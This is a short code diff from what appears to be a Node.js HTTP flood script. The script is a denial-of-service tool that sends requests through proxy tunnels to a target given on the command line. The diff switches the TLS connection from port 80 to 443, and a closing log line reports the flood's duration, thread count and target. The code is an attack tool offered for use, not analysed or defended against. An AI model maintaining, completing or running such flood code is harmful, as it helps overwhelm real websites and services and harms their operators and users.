@@ -117,7 +117,7 @@ req.on('connect', function (res, socket, head) {
         honorCipherOrder: true,
         requestCert: true,
         host: parsed.host,
-        port: 80,
+        port: 443,
         secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
         /*                      |                           |
                                 SSL_OP_NO_TLSv1/SSL_OP_NO_DTLSv1                Disable TLSv1/DTLSv1. 
@@ -173,3 +173,4 @@ setTimeout(() => {
     console.log('\nHTTP QUERY flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
   process.exit(1);
 }, VarsDefinetions.time*1000)
+
